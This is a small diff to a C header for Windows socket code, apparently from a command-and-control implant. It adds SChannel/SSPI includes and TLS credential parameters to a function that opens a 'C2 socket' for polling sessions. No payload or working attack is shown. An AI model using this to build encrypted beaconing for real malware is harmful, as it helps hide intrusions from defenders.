@@ -2,7 +2,8 @@
 #include <WinSock2.h>
 #include <WS2tcpip.h>
 #include <Windows.h>
-
+#include <schannel.h>
+#include <sspi.h>
 #include "debug.h"
 
 ///Change such that build script can change to arbitrary ip and port 
@@ -32,7 +33,7 @@ BOOL NetworkStartup(VOID);
  *
  * @return TRUE on success, or FALSE if any connection step fails.
  */
-BOOL NetworkInit(PCWSTR host, PCWSTR port, SOCKET* sock);
+BOOL NetworkInit(PCWSTR host, PCWSTR port, SOCKET* sock, SCHANNEL_CRED* credentialPointer, CredHandle credHandle, CtxtHandle contextHandle);
 
 /**
  * @brief Cleans up an active C2 socket after a polling session.
